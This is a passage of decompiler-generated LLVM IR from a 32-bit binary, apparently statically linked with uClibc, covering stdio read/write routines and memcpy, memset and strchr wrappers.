  %v1_805c517 = icmp eq i32 %v5_805c50f, 0
  store i1 %v1_805c517, i1* %zf.global-to-local, align 1
  %v1_805c519 = icmp eq i1 %v1_805c517, false
  br i1 %v1_805c519, label %dec_label_pc_805c5f1, label %dec_label_pc_805c51f

dec_label_pc_805c51f:                             ; preds = %dec_label_pc_805c507, %entry
  %v5_805c51f = icmp eq i32 %arg2, 0
  store i1 %v5_805c51f, i1* %zf.global-to-local, align 1
  br i1 %v5_805c51f, label %dec_label_pc_805c5f1, label %dec_label_pc_805c52a

dec_label_pc_805c52a:                             ; preds = %dec_label_pc_805c51f
  %v1_805c52a = icmp eq i32 %arg3, 0
  store i1 %v1_805c52a, i1* %zf.global-to-local, align 1
  br i1 %v1_805c52a, label %dec_label_pc_805c5f1, label %dec_label_pc_805c532

dec_label_pc_805c532:                             ; preds = %dec_label_pc_805c52a
  %v12_805c537 = udiv i64 4294967295, %tmp32
  %v13_805c537 = trunc i64 %v12_805c537 to i32
  %v14_805c537 = urem i64 4294967295, %tmp32
  %v15_805c537 = trunc i64 %v14_805c537 to i32
  store i32 %v15_805c537, i32* %edx.global-to-local, align 4
  %v12_805c53b = icmp eq i32 %v13_805c537, %arg3
  store i1 %v12_805c53b, i1* %zf.global-to-local, align 1
  %v6_805c53d = icmp ult i32 %v13_805c537, %arg3
  br i1 %v6_805c53d, label %dec_label_pc_805c5e1, label %dec_label_pc_805c543

dec_label_pc_805c543:                             ; preds = %dec_label_pc_805c532
  %v8_805c543 = mul i32 %arg3, %arg2
  store i32 %v8_805c543, i32* @ebx, align 4
  %v4_805c548 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805c548, i32* @edi, align 4
  store i32 %v8_805c543, i32* @esi, align 4
  %v0_805c56f7 = load i32, i32* @ebp, align 4
  %v1_805c56f8 = inttoptr i32 %v0_805c56f7 to i32*
  %v2_805c56f9 = load i32, i32* %v1_805c56f8, align 4
  store i32 %v2_805c56f9, i32* %edx.global-to-local, align 4
  %v2_805c57511 = and i32 %v2_805c56f9, 2
  %v3_805c57512 = icmp eq i32 %v2_805c57511, 0
  store i1 %v3_805c57512, i1* %zf.global-to-local, align 1
  %v1_805c57713 = icmp eq i1 %v3_805c57512, false
  br i1 %v1_805c57713, label %dec_label_pc_805c554, label %dec_label_pc_805c579

dec_label_pc_805c554:                             ; preds = %dec_label_pc_805c543, %dec_label_pc_805c56e.dec_label_pc_805c554_crit_edge
  %v2_805c55c = phi i32 [ %v1_805c56e, %dec_label_pc_805c56e.dec_label_pc_805c554_crit_edge ], [ %v4_805c548, %dec_label_pc_805c543 ]
  %v0_805c558 = phi i32 [ %v0_805c56f, %dec_label_pc_805c56e.dec_label_pc_805c554_crit_edge ], [ %v0_805c56f7, %dec_label_pc_805c543 ]
  %v0_805c557 = phi i32 [ %v0_805c557.pre, %dec_label_pc_805c56e.dec_label_pc_805c554_crit_edge ], [ %v8_805c543, %dec_label_pc_805c543 ]
  %v0_805c554.in = phi i32 [ %v2_805c56f, %dec_label_pc_805c56e.dec_label_pc_805c554_crit_edge ], [ %v2_805c56f9, %dec_label_pc_805c543 ]
  %v0_805c554 = urem i32 %v0_805c554.in, 65536
  %v1_805c554 = urem i32 %v0_805c554, 2
  %v1_805c557 = add i32 %v0_805c557, -1
  %v8_805c557 = icmp eq i32 %v1_805c557, 0
  store i1 %v8_805c557, i1* %zf.global-to-local, align 1
  store i32 %v1_805c557, i32* @esi, align 4
  %tmp46 = sub nsw i32 0, %v1_805c554
  %v2_805c558 = and i32 %tmp46, 4
  %v3_805c558 = add i32 %v0_805c558, 36
  %v4_805c558 = add i32 %v3_805c558, %v2_805c558
  %v5_805c558 = inttoptr i32 %v4_805c558 to i32*
  %v6_805c558 = load i32, i32* %v5_805c558, align 4
  %v1_805c55c = trunc i32 %v6_805c558 to i8
  %v3_805c55c = inttoptr i32 %v2_805c55c to i8*
  store i8 %v1_805c55c, i8* %v3_805c55c, align 1
  %v0_805c55e = load i32, i32* %edx.global-to-local, align 4
  %v1_805c55e = add i32 %v0_805c55e, 65535
  %v1_805c561 = trunc i32 %v1_805c55e to i16
  %v2_805c561 = load i32, i32* @ebp, align 4
  %v3_805c561 = inttoptr i32 %v2_805c561 to i16*
  store i16 %v1_805c561, i16* %v3_805c561, align 2
  %v0_805c565 = load i32, i32* @ebp, align 4
  %v1_805c565 = add i32 %v0_805c565, 40
  %v2_805c565 = inttoptr i32 %v1_805c565 to i32*
  store i32 0, i32* %v2_805c565, align 4
  %v0_805c56c = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_805c56c, label %dec_label_pc_805c5d1, label %dec_label_pc_805c56e

dec_label_pc_805c56e:                             ; preds = %dec_label_pc_805c554
  %v0_805c56e = load i32, i32* @edi, align 4
  %v1_805c56e = add i32 %v0_805c56e, 1
  store i32 %v1_805c56e, i32* @edi, align 4
  %v0_805c56f = load i32, i32* @ebp, align 4
  %v1_805c56f = inttoptr i32 %v0_805c56f to i32*
  %v2_805c56f = load i32, i32* %v1_805c56f, align 4
  store i32 %v2_805c56f, i32* %edx.global-to-local, align 4
  %v2_805c575 = and i32 %v2_805c56f, 2
  %v3_805c575 = icmp eq i32 %v2_805c575, 0
  store i1 %v3_805c575, i1* %zf.global-to-local, align 1
  %v1_805c577 = icmp eq i1 %v3_805c575, false
  br i1 %v1_805c577, label %dec_label_pc_805c56e.dec_label_pc_805c554_crit_edge, label %dec_label_pc_805c579

dec_label_pc_805c56e.dec_label_pc_805c554_crit_edge: ; preds = %dec_label_pc_805c56e
  %v0_805c557.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c554

dec_label_pc_805c579:                             ; preds = %dec_label_pc_805c56e, %dec_label_pc_805c543
  %v0_805c58e = phi i32 [ %v4_805c548, %dec_label_pc_805c543 ], [ %v1_805c56e, %dec_label_pc_805c56e ]
  %v0_805c579 = phi i32 [ %v0_805c56f7, %dec_label_pc_805c543 ], [ %v0_805c56f, %dec_label_pc_805c56e ]
  %v1_805c579 = add i32 %v0_805c579, 16
  %v2_805c579 = inttoptr i32 %v1_805c579 to i32*
  %v3_805c579 = load i32, i32* %v2_805c579, align 4
  store i32 %v3_805c579, i32* %edx.global-to-local, align 4
  %v1_805c57c = add i32 %v0_805c579, 20
  %v2_805c57c = inttoptr i32 %v1_805c57c to i32*
  %v3_805c57c = load i32, i32* %v2_805c57c, align 4
  %v2_805c57f = sub i32 %v3_805c57c, %v3_805c579
  %v12_805c57f = icmp eq i32 %v2_805c57f, 0
  store i1 %v12_805c57f, i1* %zf.global-to-local, align 1
  br i1 %v12_805c57f, label %dec_label_pc_805c5a0, label %dec_label_pc_805c583

dec_label_pc_805c583:                             ; preds = %dec_label_pc_805c579
  %v0_805c583 = load i32, i32* @esi, align 4
  store i32 %v0_805c583, i32* @ebx, align 4
  %v12_805c585 = icmp eq i32 %v0_805c583, %v2_805c57f
  store i1 %v12_805c585, i1* %zf.global-to-local, align 1
  %tmp57 = icmp ugt i32 %v0_805c583, %v2_805c57f
  br i1 %tmp57, label %dec_label_pc_805c589, label %dec_label_pc_805c58b

dec_label_pc_805c589:                             ; preds = %dec_label_pc_805c583
  store i32 %v2_805c57f, i32* @ebx, align 4
  br label %dec_label_pc_805c58b

dec_label_pc_805c58b:                             ; preds = %dec_label_pc_805c583, %dec_label_pc_805c589
  %v0_805c58c = phi i32 [ %v0_805c583, %dec_label_pc_805c583 ], [ %v2_805c57f, %dec_label_pc_805c589 ]
  %v5_805c58e = inttoptr i32 %v0_805c58e to i16*
  %v6_805c58f = call i32 @memcpy(i16* %v5_805c58e, i32 %v3_805c579, i32 %v0_805c58c)
  %v0_805c594 = load i32, i32* @ebp, align 4
  %v1_805c594 = add i32 %v0_805c594, 16
  %v2_805c594 = inttoptr i32 %v1_805c594 to i32*
  %v3_805c594 = load i32, i32* %v2_805c594, align 4
  %v4_805c594 = load i32, i32* @ebx, align 4
  %v5_805c594 = add i32 %v4_805c594, %v3_805c594
  store i32 %v5_805c594, i32* %v2_805c594, align 4
  %v0_805c59a = load i32, i32* @esi, align 4
  %v1_805c59a = load i32, i32* @ebx, align 4
  %v2_805c59a = sub i32 %v0_805c59a, %v1_805c59a
  %v12_805c59a = icmp eq i32 %v2_805c59a, 0
  store i1 %v12_805c59a, i1* %zf.global-to-local, align 1
  store i32 %v2_805c59a, i32* @esi, align 4
  br i1 %v12_805c59a, label %dec_label_pc_805c5d1, label %dec_label_pc_805c59e

dec_label_pc_805c59e:                             ; preds = %dec_label_pc_805c58b
  %v0_805c59e = load i32, i32* @edi, align 4
  %v2_805c59e = add i32 %v0_805c59e, %v1_805c59a
  %v12_805c59e = icmp eq i32 %v2_805c59e, 0
  store i1 %v12_805c59e, i1* %zf.global-to-local, align 1
  store i32 %v2_805c59e, i32* @edi, align 4
  %v0_805c5a0.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805c5a0

dec_label_pc_805c5a0:                             ; preds = %dec_label_pc_805c579, %dec_label_pc_805c59e
  %v0_805c5c3.pre28 = phi i32 [ %v0_805c58e, %dec_label_pc_805c579 ], [ %v2_805c59e, %dec_label_pc_805c59e ]
  %v0_805c5a0 = phi i32 [ %v0_805c579, %dec_label_pc_805c579 ], [ %v0_805c5a0.pre, %dec_label_pc_805c59e ]
  %v1_805c5a0 = inttoptr i32 %v0_805c5a0 to i16*
  %v2_805c5a0 = load i16, i16* %v1_805c5a0, align 2
  %v3_805c5a4 = and i16 %v2_805c5a0, 768
  %v4_805c5a4 = icmp eq i16 %v3_805c5a4, 0
  store i1 %v4_805c5a4, i1* %zf.global-to-local, align 1
  br i1 %v4_805c5a4, label %dec_label_pc_805c5a0.dec_label_pc_805c5c1.preheader_crit_edge, label %dec_label_pc_805c5a9

dec_label_pc_805c5a0.dec_label_pc_805c5c1.preheader_crit_edge: ; preds = %dec_label_pc_805c5a0
  %v3_805c5a0 = zext i16 %v2_805c5a0 to i32
  br label %dec_label_pc_805c5c1.preheader

dec_label_pc_805c5a9:                             ; preds = %dec_label_pc_805c5a0
  %v0_805c5a9 = load i32, i32* @esp, align 4
  %v9_805c5a9 = icmp eq i32 %v0_805c5a9, 12
  store i1 %v9_805c5a9, i1* %zf.global-to-local, align 1
  %v3_805c5b1 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8073d7c.702 to i16*))
  %v0_805c5b6 = load i32, i32* @esp, align 4
  %v6_805c5b6 = icmp eq i32 %v0_805c5b6, -16
  store i1 %v6_805c5b6, i1* %zf.global-to-local, align 1
  %v0_805c5c3.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805c5c1.preheader

dec_label_pc_805c5c1.preheader:                   ; preds = %dec_label_pc_805c5a0.dec_label_pc_805c5c1.preheader_crit_edge, %dec_label_pc_805c5a9
  %v0_805c5c3.pre = phi i32 [ %v0_805c5c3.pre28, %dec_label_pc_805c5a0.dec_label_pc_805c5c1.preheader_crit_edge ], [ %v0_805c5c3.pre.pre, %dec_label_pc_805c5a9 ]
  %v0_805c5c123 = phi i32 [ %v3_805c5a0, %dec_label_pc_805c5a0.dec_label_pc_805c5c1.preheader_crit_edge ], [ %v3_805c5b1, %dec_label_pc_805c5a9 ]
  %v0_805c5c2.pre = load i32, i32* @esi, align 4
  %tmp4751 = inttoptr i32 %v0_805c5c3.pre to i16*
  %v5_805c5c552 = call i32 @__stdio_READ(i16* %tmp4751, i32 %v0_805c5c2.pre, i32 %v0_805c5c123)
  %v1_805c5cd53 = icmp eq i32 %v5_805c5c552, 0
  store i1 %v1_805c5cd53, i1* %zf.global-to-local, align 1
  %v1_805c5cf54 = icmp eq i1 %v1_805c5cd53, false
  br i1 %v1_805c5cf54, label %dec_label_pc_805c5bb, label %dec_label_pc_805c5d1

dec_label_pc_805c5bb:                             ; preds = %dec_label_pc_805c5c1.preheader, %dec_label_pc_805c5bf
  %v5_805c5c555 = phi i32 [ %v5_805c5c5, %dec_label_pc_805c5bf ], [ %v5_805c5c552, %dec_label_pc_805c5c1.preheader ]
  %v0_805c5bb = load i32, i32* @esi, align 4
  %v2_805c5bb = sub i32 %v0_805c5bb, %v5_805c5c555
  %v12_805c5bb = icmp eq i32 %v2_805c5bb, 0
  store i1 %v12_805c5bb, i1* %zf.global-to-local, align 1
  store i32 %v2_805c5bb, i32* @esi, align 4
  br i1 %v12_805c5bb, label %dec_label_pc_805c5d1, label %dec_label_pc_805c5bf

dec_label_pc_805c5bf:                             ; preds = %dec_label_pc_805c5bb
  %v0_805c5bf = load i32, i32* @edi, align 4
  %v2_805c5bf = add i32 %v0_805c5bf, %v5_805c5c555
  %v12_805c5bf = icmp eq i32 %v2_805c5bf, 0
  store i1 %v12_805c5bf, i1* %zf.global-to-local, align 1
  store i32 %v2_805c5bf, i32* @edi, align 4
  %tmp47 = inttoptr i32 %v2_805c5bf to i16*
  %v5_805c5c5 = call i32 @__stdio_READ(i16* %tmp47, i32 %v2_805c5bb, i32 %v5_805c5c555)
  %v1_805c5cd = icmp eq i32 %v5_805c5c5, 0
  store i1 %v1_805c5cd, i1* %zf.global-to-local, align 1
  %v1_805c5cf = icmp eq i1 %v1_805c5cd, false
  br i1 %v1_805c5cf, label %dec_label_pc_805c5bb, label %dec_label_pc_805c5d1

dec_label_pc_805c5d1:                             ; preds = %dec_label_pc_805c554, %dec_label_pc_805c5c1.preheader, %dec_label_pc_805c5bf, %dec_label_pc_805c5bb, %dec_label_pc_805c58b
  %v5_805c5d1 = load i32, i32* @esi, align 4
  %v6_805c5d1 = sub i32 %v8_805c543, %v5_805c5d1
  %v26_805c5d15 = zext i32 %v6_805c5d1 to i64
  store i1 true, i1* %zf.global-to-local, align 1
  %v12_805c5db = udiv i64 %v26_805c5d15, %tmp32
  %v13_805c5db = trunc i64 %v12_805c5db to i32
  %v14_805c5db = urem i64 %v26_805c5d15, %tmp32
  %v15_805c5db = trunc i64 %v14_805c5db to i32
  store i32 %v15_805c5db, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c5f3

dec_label_pc_805c5e1:                             ; preds = %dec_label_pc_805c532
  %v0_805c5e1 = load i32, i32* @ebp, align 4
  %v1_805c5e1 = inttoptr i32 %v0_805c5e1 to i16*
  %v2_805c5e1 = load i16, i16* %v1_805c5e1, align 2
  %v3_805c5e1 = or i16 %v2_805c5e1, 8
  store i1 false, i1* %zf.global-to-local, align 1
  store i16 %v3_805c5e1, i16* %v1_805c5e1, align 2
  %v1_805c5e6 = trunc i64 %tmp to i32
  %v2_805c5e6 = call i32 @__errno_location(i32 %v1_805c5e6)
  %v1_805c5eb = inttoptr i32 %v2_805c5e6 to i32*
  store i32 22, i32* %v1_805c5eb, align 4
  br label %dec_label_pc_805c5f1

dec_label_pc_805c5f1:                             ; preds = %dec_label_pc_805c52a, %dec_label_pc_805c51f, %dec_label_pc_805c507, %dec_label_pc_805c5e1
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805c5f3

dec_label_pc_805c5f3:                             ; preds = %dec_label_pc_805c5d1, %dec_label_pc_805c5f1
  %v0_805c5fa = phi i32 [ %v13_805c5db, %dec_label_pc_805c5d1 ], [ 0, %dec_label_pc_805c5f1 ]
  %v0_805c5f3 = load i32, i32* @esp, align 4
  %v9_805c5f3 = icmp eq i32 %v0_805c5f3, -12
  store i1 %v9_805c5f3, i1* %zf.global-to-local, align 1
  store i32 %v0_805c4e9, i32* @edi, align 4
  store i32 %v0_805c4e8, i32* @ebp, align 4
  ret i32 %v0_805c5fa

; uselistorder directives
  uselistorder i32 %v5_805c5c5, { 1, 0 }
  uselistorder i32 %v5_805c5c555, { 0, 2, 1 }
  uselistorder i1 %v4_805c5a4, { 1, 0 }
  uselistorder i16 %v2_805c5a0, { 1, 0 }
  uselistorder i32 %v0_805c583, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805c57f, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_805c579, { 0, 2, 1 }
  uselistorder i1 %v3_805c575, { 1, 0 }
  uselistorder i32 %v2_805c56f, { 1, 2, 0 }
  uselistorder i32 %v0_805c56f, { 0, 2, 1 }
  uselistorder i32 %v1_805c56e, { 0, 2, 1 }
  uselistorder i32 %v1_805c557, { 1, 0 }
  uselistorder i32 %v0_805c56f7, { 1, 0, 2 }
  uselistorder i32 %v4_805c548, { 1, 0, 2 }
  uselistorder i32 %v8_805c543, { 2, 0, 3, 1 }
  uselistorder i32 %v13_805c537, { 1, 0 }
  uselistorder i32 %v1_805c4fb, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 23, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16, 0, 18, 19, 20, 21, 22 }
  uselistorder i32* %edx.global-to-local, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg3, { 1, 2, 0, 4, 3 }
  uselistorder label %dec_label_pc_805c5f3, { 1, 0 }
  uselistorder label %dec_label_pc_805c5f1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805c5d1, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_805c5bb, { 1, 0 }
  uselistorder label %dec_label_pc_805c5c1.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805c5a0, { 1, 0 }
  uselistorder label %dec_label_pc_805c58b, { 1, 0 }
  uselistorder label %dec_label_pc_805c554, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805c5fc = load i32, i32* @edi, align 4
  %v0_805c5fd = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_805c603 = trunc i64 %arg2 to i32
  store i32 %v4_805c603, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_805c60b = inttoptr i32 %arg4 to i16*
  %v2_805c60b = load i16, i16* %v1_805c60b, align 2
  %v1_805c60e = and i16 %v2_805c60b, 192
  %v6_805c613 = icmp eq i16 %v1_805c60e, 192
  br i1 %v6_805c613, label %dec_label_pc_805c62e, label %dec_label_pc_805c61a

dec_label_pc_805c61a:                             ; preds = %entry
  %v0_805c61a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_805c622 = call i32 @__stdio_trans2w_o(i16* %v1_805c60b, i32 128, i32 %v0_805c61a, i32 %v0_805c61a)
  %v1_805c62a = icmp eq i32 %v6_805c622, 0
  %v1_805c62c = icmp eq i1 %v1_805c62a, false
  br i1 %v1_805c62c, label %dec_label_pc_805c66a, label %dec_label_pc_805c62e

dec_label_pc_805c62e:                             ; preds = %dec_label_pc_805c61a, %entry
  %v2_805c62e = icmp eq i32 %v4_805c603, 0
  br i1 %v2_805c62e, label %dec_label_pc_805c66a, label %dec_label_pc_805c632

dec_label_pc_805c632:                             ; preds = %dec_label_pc_805c62e
  %v1_805c632 = icmp eq i32 %arg3, 0
  br i1 %v1_805c632, label %dec_label_pc_805c66a, label %dec_label_pc_805c636

dec_label_pc_805c636:                             ; preds = %dec_label_pc_805c632
  %v9_805c63b = udiv i64 4294967295, %arg2
  %v10_805c63b = trunc i64 %v9_805c63b to i32
  %v6_805c63f = icmp ult i32 %v10_805c63b, %arg3
  br i1 %v6_805c63f, label %dec_label_pc_805c65b, label %dec_label_pc_805c641

dec_label_pc_805c641:                             ; preds = %dec_label_pc_805c636
  %sext = mul i64 %arg2, 4294967296
  %v2_805c644 = sdiv i64 %sext, 4294967296
  %v3_805c644 = sext i32 %arg3 to i64
  %v4_805c644 = mul nsw i64 %v3_805c644, %v2_805c644
  %v5_805c644 = trunc i64 %v4_805c644 to i32
  %v0_805c647 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_805c64d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_805c644, i32 %v0_805c647, i32 %v10_805c63b)
  %v6_805c64d = sext i32 %v5_805c64d to i64
  %v10_805c654 = udiv i64 %v6_805c64d, %arg2
  %v11_805c654 = trunc i64 %v10_805c654 to i32
  br label %dec_label_pc_805c66c

dec_label_pc_805c65b:                             ; preds = %dec_label_pc_805c636
  %v0_805c65b = load i32, i32* @ebx, align 4
  %v1_805c65b = inttoptr i32 %v0_805c65b to i16*
  %v2_805c65b = load i16, i16* %v1_805c65b, align 2
  %v3_805c65b = or i16 %v2_805c65b, 8
  store i16 %v3_805c65b, i16* %v1_805c65b, align 2
  %v0_805c65f = load i32, i32* %stack_var_-28, align 4
  %v1_805c65f = call i32 @__errno_location(i32 %v0_805c65f)
  %v1_805c664 = inttoptr i32 %v1_805c65f to i32*
  store i32 22, i32* %v1_805c664, align 4
  br label %dec_label_pc_805c66a

dec_label_pc_805c66a:                             ; preds = %dec_label_pc_805c632, %dec_label_pc_805c62e, %dec_label_pc_805c61a, %dec_label_pc_805c65b
  br label %dec_label_pc_805c66c

dec_label_pc_805c66c:                             ; preds = %dec_label_pc_805c641, %dec_label_pc_805c66a
  %v0_805c66f = phi i32 [ %v11_805c654, %dec_label_pc_805c641 ], [ 0, %dec_label_pc_805c66a ]
  store i32 %v0_805c5fd, i32* @esi, align 4
  store i32 %v0_805c5fc, i32* @edi, align 4
  ret i32 %v0_805c66f

; uselistorder directives
  uselistorder i32 %v0_805c61a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 (i16*, i32, i32, i32)* @__stdio_trans2w_o, { 1, 0, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805c66c, { 1, 0 }
  uselistorder label %dec_label_pc_805c66a, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805c671 = load i32, i32* @esi, align 4
  store i32 %v0_805c671, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_805c672 = sdiv i32 %sext, 16777216
  store i32 %v4_805c672, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805c67c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805c67c, i32* %edi.global-to-local, align 4
  %v2_805c680 = udiv i32 %v4_805c672, 4
  %v3_805c683 = inttoptr i32 %arg2 to i8*
  %v4_805c683 = bitcast i16* %arg1 to i8*
  %v5_805c683 = call i8* @_memcpy(i8* %v4_805c683, i8* %v3_805c683, i32 %v2_805c680)
  %v6_805c683 = ptrtoint i8* %v5_805c683 to i32
  store i32 %v6_805c683, i32* @ecx, align 4
  %v0_805c685 = load i32, i32* %eax.global-to-local, align 4
  %v2_805c685 = and i32 %v0_805c685, 2
  %v3_805c685 = icmp eq i32 %v2_805c685, 0
  br i1 %v3_805c685, label %dec_label_pc_805c68b, label %dec_label_pc_805c689

dec_label_pc_805c689:                             ; preds = %entry
  %v0_805c689 = load i32, i32* %esi.global-to-local, align 4
  %v1_805c689 = inttoptr i32 %v0_805c689 to i16*
  %v2_805c689 = load i16, i16* %v1_805c689, align 2
  %v3_805c689 = load i32, i32* %edi.global-to-local, align 4
  %v4_805c689 = inttoptr i32 %v3_805c689 to i16*
  store i16 %v2_805c689, i16* %v4_805c689, align 2
  %v5_805c689 = load i32, i32* %edi.global-to-local, align 4
  %v6_805c689 = load i32, i32* %esi.global-to-local, align 4
  %v7_805c689 = load i1, i1* @df, align 1
  %v8_805c689 = select i1 %v7_805c689, i32 -2, i32 2
  %v9_805c689 = add i32 %v8_805c689, %v5_805c689
  %v10_805c689 = add i32 %v8_805c689, %v6_805c689
  store i32 %v9_805c689, i32* %edi.global-to-local, align 4
  store i32 %v10_805c689, i32* %esi.global-to-local, align 4
  %v0_805c68b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c68b

dec_label_pc_805c68b:                             ; preds = %entry, %dec_label_pc_805c689
  %v0_805c68b = phi i32 [ %v0_805c685, %entry ], [ %v0_805c68b.pre, %dec_label_pc_805c689 ]
  %v2_805c68b = urem i32 %v0_805c68b, 2
  %v3_805c68b = icmp eq i32 %v2_805c68b, 0
  br i1 %v3_805c68b, label %dec_label_pc_805c690, label %dec_label_pc_805c68f

dec_label_pc_805c68f:                             ; preds = %dec_label_pc_805c68b
  %v0_805c68f = load i32, i32* %esi.global-to-local, align 4
  %v1_805c68f = inttoptr i32 %v0_805c68f to i8*
  %v2_805c68f = load i8, i8* %v1_805c68f, align 1
  %v3_805c68f = load i32, i32* %edi.global-to-local, align 4
  %v4_805c68f = inttoptr i32 %v3_805c68f to i8*
  store i8 %v2_805c68f, i8* %v4_805c68f, align 1
  %v5_805c68f = load i32, i32* %edi.global-to-local, align 4
  %v6_805c68f = load i32, i32* %esi.global-to-local, align 4
  %v7_805c68f = load i1, i1* @df, align 1
  %v8_805c68f = select i1 %v7_805c68f, i32 -1, i32 1
  %v9_805c68f = add i32 %v8_805c68f, %v5_805c68f
  %v10_805c68f = add i32 %v8_805c68f, %v6_805c68f
  store i32 %v9_805c68f, i32* %edi.global-to-local, align 4
  store i32 %v10_805c68f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805c690

dec_label_pc_805c690:                             ; preds = %dec_label_pc_805c68b, %dec_label_pc_805c68f
  store i32 %v4_805c67c, i32* %eax.global-to-local, align 4
  %v2_805c694 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c694, i32* @esi, align 4
  ret i32 %v4_805c67c

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_805c690, { 1, 0 }
  uselistorder label %dec_label_pc_805c68b, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805c698 = load i32, i32* @edi, align 4
  %v4_805c6a1 = ptrtoint i8* %arg1 to i32
  %v5_805c6a5 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_805c6a5 = ptrtoint i8* %v5_805c6a5 to i32
  store i32 %v6_805c6a5, i32* @ecx, align 4
  store i32 %v0_805c698, i32* @edi, align 4
  ret i32 %v4_805c6a1

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805c6b1 = ptrtoint i8* %arg1 to i32
  %v2_805c6b9 = mul i32 %arg2, 256
  %v3_805c6b9 = and i32 %v2_805c6b9, 65280
  %v4_805c6b9 = and i32 %arg2, -65281
  %v5_805c6b9 = or i32 %v3_805c6b9, %v4_805c6b9
  %v8_805c6bb.pre = load i1, i1* @df, align 1
  %v9_805c6bb = select i1 %v8_805c6bb.pre, i32 -1, i32 1
  br label %dec_label_pc_805c6bb

dec_label_pc_805c6bb:                             ; preds = %dec_label_pc_805c6c0, %entry
  %v4_805c6bb = phi i32 [ %v6_805c6bb, %dec_label_pc_805c6c0 ], [ %v5_805c6b9, %entry ]
  %v7_805c6bb = phi i32 [ %v10_805c6bb, %dec_label_pc_805c6c0 ], [ %v4_805c6b1, %entry ]
  %v1_805c6bb = inttoptr i32 %v7_805c6bb to i8*
  %v2_805c6bb = load i8, i8* %v1_805c6bb, align 1
  %v10_805c6bb = add i32 %v7_805c6bb, %v9_805c6bb
  %v3_805c6bc = udiv i32 %v4_805c6bb, 256
  %v4_805c6bc = trunc i32 %v3_805c6bc to i8
  %v16_805c6bc = icmp eq i8 %v2_805c6bb, %v4_805c6bc
  br i1 %v16_805c6bc, label %dec_label_pc_805c6c9, label %dec_label_pc_805c6c0

dec_label_pc_805c6c0:                             ; preds = %dec_label_pc_805c6bb
  %v3_805c6bb = zext i8 %v2_805c6bb to i32
  %v5_805c6bb = and i32 %v4_805c6bb, -256
  %v6_805c6bb = or i32 %v3_805c6bb, %v5_805c6bb
  %v4_805c6c0 = icmp eq i8 %v2_805c6bb, 0
  %v1_805c6c2 = icmp eq i1 %v4_805c6c0, false
  br i1 %v1_805c6c2, label %dec_label_pc_805c6bb, label %dec_label_pc_805c6c4

dec_label_pc_805c6c4:                             ; preds = %dec_label_pc_805c6c0
  br label %dec_label_pc_805c6c9

dec_label_pc_805c6c9:                             ; preds = %dec_label_pc_805c6bb, %dec_label_pc_805c6c4
  %v0_805c6c9 = phi i32 [ 1, %dec_label_pc_805c6c4 ], [ %v10_805c6bb, %dec_label_pc_805c6bb ]
  %v1_805c6cb = add i32 %v0_805c6c9, -1
  ret i32 %v1_805c6cb

; uselistorder directives
  uselistorder i8 %v2_805c6bb, { 1, 2, 0 }
  uselistorder i32 %v4_805c6bb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805c6c9, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_3()
  %v4_805c6d2 = ptrtoint i8* %arg1 to i32
  %v4_805c6d6 = ptrtoint i8* %tmp to i32
  %v4_805c6da.pre = load i32, i32* @eax, align 4
  %v8_805c6da.pre = load i1, i1* @df, align 1
  %v9_805c6da = select i1 %v8_805c6da.pre, i32 -1, i32 1
  br label %dec_label_pc_805c6da

dec_label_pc_805c6da:                             ; preds = %dec_label_pc_805c6de, %entry
